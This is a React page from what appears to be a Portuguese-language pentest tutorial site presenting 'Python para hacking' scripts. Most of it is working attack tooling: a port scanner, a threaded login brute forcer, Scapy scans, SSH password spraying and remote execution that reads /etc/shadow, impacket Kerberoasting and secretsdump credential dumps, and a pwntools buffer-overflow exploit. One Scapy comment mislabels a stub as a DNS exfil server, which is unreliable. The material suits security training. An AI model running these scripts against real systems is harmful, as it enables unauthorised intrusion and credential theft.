import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function PythonHacking() {
  return (
    <PageContainer
      title="Python para hacking"
      subtitle="Bibliotecas essenciais (requests, scapy, paramiko, pwntools, impacket) com scripts prontos."
      difficulty="intermediario"
      timeToRead="20 min"
      prompt="dev/python"
    >
      <h2>Setup do ambiente</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "python3 --version && pip3 --version",
            out: `Python 3.12.7
pip 24.2 from /usr/lib/python3/dist-packages/pip (python 3.12)`,
            outType: "info",
          },
          {
            comment: "isolar deps: SEMPRE use venv (PEP 668 bloqueia pip global)",
            cmd: "python3 -m venv ~/.venv-pentest && source ~/.venv-pentest/bin/activate",
            out: "(venv) wallyson@kali:~$",
            outType: "muted",
          },
          {
            cmd: "pip install requests scapy paramiko impacket pwntools beautifulsoup4 colorama",
            out: `Collecting requests
  Downloading requests-2.32.3-py3-none-any.whl (64 kB)
Collecting scapy
  Downloading scapy-2.5.0.tar.gz (1.3 MB)
Collecting paramiko
  Downloading paramiko-3.4.0-py3-none-any.whl (225 kB)
Collecting impacket
  Downloading impacket-0.11.0.tar.gz (1.4 MB)
Collecting pwntools
  Downloading pwntools-4.13.0-py3-none-any.whl (3.4 MB)
[...]
Successfully installed PySocks-1.7.1 bcrypt-4.2.0 beautifulsoup4-4.12.3 ...`,
            outType: "success",
          },
        ]}
      />

      <h2>Bibliotecas essenciais</h2>
      <CommandTable
        title="O que importar para o quê"
        variations={[
          { cmd: "requests", desc: "HTTP client moderno.", output: "Sessions, cookies, proxies, multipart." },
          { cmd: "BeautifulSoup4", desc: "Parser HTML.", output: "Para scraping / extrair forms." },
          { cmd: "scapy", desc: "Manipulação raw de pacotes.", output: "ARP, ICMP, TCP/IP custom." },
          { cmd: "paramiko / fabric", desc: "Cliente SSH.", output: "Brute, exec remoto." },
          { cmd: "impacket", desc: "Protocolos Windows (SMB, MSRPC, Kerberos, LDAP).", output: "Padrão para AD pentest." },
          { cmd: "pwntools", desc: "Framework de exploit (CTF/binary).", output: "ROP, shellcode, gdb integration." },
          { cmd: "pycryptodome", desc: "Crypto (AES, RSA, hashes).", output: "Para CTFs crypto." },
          { cmd: "colorama / rich", desc: "Output bonito.", output: "Print de tabelas/cores." },
          { cmd: "argparse", desc: "CLI args (stdlib).", output: "Toda ferramenta deve ter -h." },
          { cmd: "concurrent.futures", desc: "Threads/processes (stdlib).", output: "Para varredura paralela." },
        ]}
      />

      <h2>Port scanner threadado</h2>
      <CodeBlock
        language="python"
        title="port_scan.py"
        code={`#!/usr/bin/env python3
"""Scanner TCP simples e rápido com threads."""
import argparse
import socket
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

def scan(host: str, port: int, timeout: float = 0.8) -> tuple[int, str | None]:
    """Retorna (port, banner|None) se aberta, senão (port, '')."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        if s.connect_ex((host, port)) != 0:
            return port, ""
        # banner grab leve
        try:
            s.sendall(b"GET / HTTP/1.0\\r\\n\\r\\n")
            banner = s.recv(128).decode(errors="ignore").splitlines()[0]
        except Exception:
            banner = None
        return port, banner

def main() -> None:
    p = argparse.ArgumentParser()
    p.add_argument("host")
    p.add_argument("-p", default="1-1024", help="ranges: 22,80,443  ou  1-65535")
    p.add_argument("-t", type=int, default=200)
    args = p.parse_args()

    ports: list[int] = []
    for chunk in args.p.split(","):
        if "-" in chunk:
            a, b = (int(x) for x in chunk.split("-"))
            ports.extend(range(a, b + 1))
        else:
            ports.append(int(chunk))

    print(f"[*] {args.host}: {len(ports)} portas, {args.t} threads")
    with ThreadPoolExecutor(max_workers=args.t) as ex:
        futs = [ex.submit(scan, args.host, port) for port in ports]
        for f in as_completed(futs):
            port, banner = f.result()
            if banner is not None:
                print(f"[+] {port}/tcp open  {banner or ''}")

if __name__ == "__main__":
    main()`}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "python3 port_scan.py scanme.nmap.org -p 20-100",
            out: `[*] scanme.nmap.org: 81 portas, 200 threads
[+] 22/tcp open  SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13
[+] 80/tcp open  HTTP/1.1 200 OK`,
            outType: "info",
          },
        ]}
      />

      <h2>Banner grabber + service detection</h2>
      <CodeBlock
        language="python"
        title="banner.py"
        code={`import socket, ssl, sys

PROBES = {
    21: b"",                                                # FTP manda 220 sozinho
    22: b"",                                                # SSH idem
    25: b"",                                                # SMTP idem
    80: b"HEAD / HTTP/1.0\\r\\n\\r\\n",
    443: b"HEAD / HTTP/1.0\\r\\nHost: x\\r\\n\\r\\n",         # via TLS
    6379: b"INFO\\r\\n",                                    # Redis
    9200: b"GET / HTTP/1.0\\r\\n\\r\\n",                     # Elasticsearch
}

def grab(host, port):
    s = socket.socket()
    s.settimeout(3)
    try:
        s.connect((host, port))
        if port == 443:
            s = ssl.create_default_context().wrap_socket(s, server_hostname=host)
        s.sendall(PROBES.get(port, b""))
        return s.recv(512).decode(errors="ignore").strip()
    finally:
        s.close()

if __name__ == "__main__":
    host = sys.argv[1]
    for p in [21, 22, 25, 80, 443, 3306, 5432, 6379, 9200]:
        try:
            print(f"[{p:5}] {grab(host, p)[:100]}")
        except Exception as e:
            print(f"[{p:5}] ✗ {type(e).__name__}")`}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "python3 banner.py scanme.nmap.org",
            out: `[   21] ✗ ConnectionRefusedError
[   22] SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13
[   25] ✗ TimeoutError
[   80] HTTP/1.1 200 OK
Server: Apache/2.4.7 (Ubuntu)
[  443] ✗ TimeoutError
[ 3306] ✗ TimeoutError
[ 6379] ✗ ConnectionRefusedError
[ 9200] ✗ ConnectionRefusedError`,
            outType: "default",
          },
        ]}
      />

      <h2>HTTP brute force (login form)</h2>
      <CodeBlock
        language="python"
        title="brute_login.py"
        code={`import requests, sys
from concurrent.futures import ThreadPoolExecutor, as_completed

URL  = "http://192.168.56.101/dvwa/login.php"
USER = "admin"

def attempt(pwd: str) -> str | None:
    s = requests.Session()
    # GET inicial para pegar token CSRF
    r = s.get(URL, timeout=5)
    token = r.text.split('user_token" value="')[1].split('"')[0]
    # POST login
    r = s.post(URL, data={
        "username": USER, "password": pwd,
        "Login": "Login", "user_token": token,
    }, allow_redirects=False, timeout=5)
    if r.status_code == 302 and "login.php" not in r.headers.get("Location", ""):
        return pwd
    return None

with open(sys.argv[1]) as f:
    pwds = [l.strip() for l in f if l.strip()]

print(f"[*] testando {len(pwds)} senhas para {USER}")
with ThreadPoolExecutor(max_workers=20) as ex:
    futs = {ex.submit(attempt, p): p for p in pwds}
    for f in as_completed(futs):
        if (got := f.result()):
            print(f"[+] FOUND: {USER} : {got}")
            for fut in futs: fut.cancel()
            break
    else:
        print("[-] nada")`}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "python3 brute_login.py /usr/share/wordlists/rockyou.txt",
            out: `[*] testando 14344392 senhas para admin
[+] FOUND: admin : password`,
            outType: "warning",
          },
        ]}
      />

      <h2>Scapy — pacotes na unha</h2>
      <CodeBlock
        language="python"
        title="recon.py — ARP scan + SYN scan + DNS enum"
        code={`from scapy.all import ARP, Ether, srp, sr1, IP, TCP, DNS, DNSQR, sr

# 1) ARP scan da LAN
def arp_scan(net="192.168.1.0/24"):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=net)
    ans, _ = srp(pkt, timeout=2, verbose=0)
    return [(r.psrc, r.hwsrc) for _, r in ans]

# 2) SYN scan stealth
def syn_scan(target, ports):
    open_ports = []
    for port in ports:
        resp = sr1(IP(dst=target)/TCP(dport=port, flags="S"),
                   timeout=1, verbose=0)
        if resp and resp.haslayer(TCP) and resp[TCP].flags == 0x12:  # SYN-ACK
            open_ports.append(port)
            sr1(IP(dst=target)/TCP(dport=port, flags="R"), timeout=0.5, verbose=0)
    return open_ports

# 3) DNS exfil server (responde tudo apontando p/ atacante)
def dns_zone_xfer(domain, ns):
    pkt = IP(dst=ns) / TCP(dport=53, flags="S")  # AXFR via TCP
    ans = sr1(pkt, timeout=2, verbose=0)
    return ans

if __name__ == "__main__":
    print("[*] ARP scan local")
    for ip, mac in arp_scan():
        print(f"    {ip:16} {mac}")

    print("[*] SYN scan 192.168.1.1 (1-100)")
    for p in syn_scan("192.168.1.1", range(1, 101)):
        print(f"    {p}/tcp open")`}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "scapy precisa de root para raw sockets",
            cmd: "sudo python3 recon.py",
            out: `[*] ARP scan local
    192.168.1.1      00:50:56:c0:00:01
    192.168.1.50     00:0c:29:8a:1b:4f
    192.168.1.107    08:00:27:de:ad:be
    192.168.1.108    bc:5f:f4:33:42:e0

[*] SYN scan 192.168.1.1 (1-100)
    22/tcp open
    53/tcp open
    80/tcp open`,
            outType: "info",
          },
        ]}
      />

      <h2>Paramiko — automação SSH</h2>
      <CodeBlock
        language="python"
        title="ssh_exec.py"
        code={`import paramiko

def exec_remote(host, user, key, cmd):
    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    cli.connect(host, username=user, key_filename=key, timeout=5)
    _, stdout, stderr = cli.exec_command(cmd)
    out = stdout.read().decode()
    err = stderr.read().decode()
    cli.close()
    return out, err

# também serve para spray de senhas
def ssh_spray(hosts, user, password):
    found = []
    for h in hosts:
        cli = paramiko.SSHClient()
        cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            cli.connect(h, username=user, password=password,
                        timeout=3, allow_agent=False, look_for_keys=False)
            print(f"[+] {h}: {user}:{password}")
            found.append(h)
        except paramiko.AuthenticationException:
            print(f"[-] {h}: auth fail")
        except Exception as e:
            print(f"[!] {h}: {e}")
        finally:
            cli.close()
    return found

# uso
out, _ = exec_remote("10.10.10.5", "deploy", "~/.ssh/id_rsa",
                    "id; uname -a; cat /etc/shadow 2>/dev/null")
print(out)`}
      />

      <h2>Impacket — AD/SMB pentest</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "impacket é Python — instala dezenas de scripts úteis",
            cmd: "pip install impacket && impacket-secretsdump --help | head",
            out: `Impacket v0.11.0 - Copyright 2023 Fortra

usage: impacket-secretsdump [-h] [-target-ip ip address] [...]`,
            outType: "info",
          },
          {
            cmd: "impacket-GetUserSPNs empresa.local/ana:'Senha@2025!' -dc-ip 10.10.10.5 -request",
            out: `Impacket v0.11.0

ServicePrincipalName  Name      MemberOf
--------------------  --------  -------------------------------------
MSSQLSvc/sql.empresa  svc-sql   CN=Domain Admins,CN=Users,DC=empresa
HTTP/web.empresa      svc-web   CN=Group Users,CN=Users,DC=empresa

$krb5tgs$23$*svc-sql$EMPRESA.LOCAL$MSSQLSvc/sql.empresa~1433~empresa.local*$abc123def456...`,
            outType: "warning",
          },
          {
            cmd: "impacket-secretsdump empresa.local/admin:'AdminDC!'@10.10.10.5",
            out: `Impacket v0.11.0
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x9eaa1bf0c6b22c9e1d3f1e84f9e8c3a1
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c1e07adc59f6c3eaa7a02e7a4e5f5cc1:::
[*] Dumping cached domain logon information (domain/username:hash)
EMPRESA.LOCAL/ana:$DCC2$10240#ana#7cba68b...
[*] Dumping LSA Secrets
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:c1e07adc...
[*] Cleaning up...`,
            outType: "error",
          },
        ]}
      />

      <h2>Pwntools — exploit dev / CTF</h2>
      <CodeBlock
        language="python"
        title="exploit.py — buffer overflow simples"
        code={`from pwn import *

context.binary = elf = ELF("./vuln")
context.log_level = "info"

# offset descoberto com cyclic / pattern_create
OFFSET = 72
RET    = elf.symbols["win"]   # função alvo

p = process("./vuln")            # ou: p = remote("alvo.com", 1337)
log.info(p.recvuntil(b"name: "))

payload  = b"A" * OFFSET
payload += p64(0xdeadbeefcafebabe)  # rbp dummy (saved)
payload += p64(RET)                 # sobrescreve RIP

p.sendline(payload)
p.interactive()                  # vira shell se win() chamar /bin/sh`}
      />

      <h2>Skeleton de toolkit profissional</h2>
      <CodeBlock
        language="python"
        title="meutool.py — argparse + logging + colors"
        code={`#!/usr/bin/env python3
"""template para qualquer ferramenta CLI de pentest."""
import argparse
import logging
import sys
from colorama import Fore, Style, init

init(autoreset=True)

GOOD = f"{Fore.GREEN}[+]{Style.RESET_ALL}"
BAD  = f"{Fore.RED}[-]{Style.RESET_ALL}"
INFO = f"{Fore.CYAN}[*]{Style.RESET_ALL}"
WARN = f"{Fore.YELLOW}[!]{Style.RESET_ALL}"

def setup_logging(verbose: bool) -> None:
    logging.basicConfig(
        level=logging.DEBUG if verbose else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%H:%M:%S",
    )

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="meutool",
        description="exemplo de tool de pentest",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    p.add_argument("target", help="host ou IP")
    p.add_argument("-p", "--ports", default="80,443,8080,8443")
    p.add_argument("-t", "--threads", type=int, default=20)
    p.add_argument("-o", "--output")
    p.add_argument("-v", "--verbose", action="store_true")
    return p.parse_args()

def main() -> int:
    args = parse_args()
    setup_logging(args.verbose)

    print(f"{INFO} alvo: {args.target}")
    print(f"{INFO} portas: {args.ports}")

    try:
        ...  # sua lógica aqui
    except KeyboardInterrupt:
        print(f"\\n{WARN} interrompido")
        return 130
    except Exception as e:
        logging.exception("erro fatal")
        return 1
    return 0

if __name__ == "__main__":
    sys.exit(main())`}
      />

      <PracticeBox
        title="Subdomain enumerator com 3 sources"
        goal="Escrever script que pega subdomínios de crt.sh + RapidDNS + bruteforce DNS, em paralelo."
        steps={[
          "Criar script subdom.py com 3 funções: from_crtsh, from_rapiddns, from_brute.",
          "Cada uma retorna set[str] de subdomínios.",
          "União dos 3 sets, ordenado, único.",
          "Filtrar só os que resolvem (DNS check).",
        ]}
        command={`cat > subdom.py <<'EOF'
import requests, dns.resolver, sys
from concurrent.futures import ThreadPoolExecutor

def from_crtsh(d):
    r = requests.get(f"https://crt.sh/?q=%25.{d}&output=json", timeout=10)
    return {n for x in r.json() for n in x["name_value"].split("\\n")}

def resolves(host):
    try: dns.resolver.resolve(host, "A", lifetime=2); return host
    except: return None

dom = sys.argv[1]
subs = from_crtsh(dom)
print(f"[*] {len(subs)} candidatos")
with ThreadPoolExecutor(max_workers=50) as ex:
    live = [s for s in ex.map(resolves, subs) if s]
print(f"[+] {len(live)} ativos")
for s in sorted(live): print(s)
EOF

pip install dnspython requests
python3 subdom.py empresa.com.br`}
        expected={`[*] 312 candidatos
[+] 87 ativos
api.empresa.com.br
api-staging.empresa.com.br
mail.empresa.com.br
[...]`}
        verify="Compare resultado com sublist3r ou amass — deve achar 80%+ do que essas tools acham."
      />

      <AlertBox type="info" title="Sempre venv, sempre type hints, sempre argparse">
        Pentest tools amadoras (sem venv, magia global, hardcoded URLs) são impossíveis de
        manter. Toda ferramenta sua deve ter <code>argparse</code>, logging configurável,
        timeout em todo I/O e sair com <code>sys.exit()</code> claro.
      </AlertBox>
    </PageContainer>
  );
}
